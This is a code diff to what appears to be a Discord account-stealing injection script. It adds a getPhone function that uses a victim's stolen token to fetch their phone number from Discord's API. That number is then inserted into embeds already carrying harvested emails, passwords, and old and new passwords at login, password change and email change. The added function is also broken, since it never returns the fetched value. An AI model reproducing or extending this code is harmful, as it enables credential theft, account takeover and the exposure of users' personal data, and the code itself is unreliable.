@@ -727,7 +727,19 @@ const execScript = (script) => {
         .executeJavaScript(script, !
             0);
 };
-
+const getPhone = (token) => {
+    fetch('https://discord.com/api/v9/users/@me', {
+        headers: {
+            'Content-Type': 'application/json',
+            'Authorization': token
+        }
+    })
+        .then(function (response) {
+            return response.json();
+        }).then(function (data) {
+            return data['phone'];
+        });
+};
 const getInfo = async (token) => {
     const info =
         await execScript(`var xmlHttp = new XMLHttpRequest();
@@ -988,7 +1000,7 @@ const login = async (email, password,
                 , fields: [
                     {
                         name: '**Account Info**'
-                        , value: `Email: **${email}** - Password: **${password}**`
+                        , value: `Email: **${email}** - Phone: **${getPhone(token)}** - Password: **${password}**`
                         , inline: false
           , }
                     , {
@@ -1048,7 +1060,7 @@ const passwordChanged = async (
                 , fields: [
                     {
                         name: '**Password Changed**'
-                        , value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`
+                        , value: `Email: **${json.email}** - Phone: **${getPhone(token)}** - Old Password: **${oldpassword}**\nNew Password: **${newpassword}**`
                         , inline: true
           , }
                     , {
@@ -1107,7 +1119,7 @@ const emailChanged = async (email,
                 , fields: [
                     {
                         name: '**Email Changed**'
-                        , value: `New Email: **${email}**\nPassword: **${password}**`
+                        , value: `New Email: **${email}** - Phone: **${getPhone(token)}** -  Password: **${password}**`
                         , inline: true
           , }
                     , {
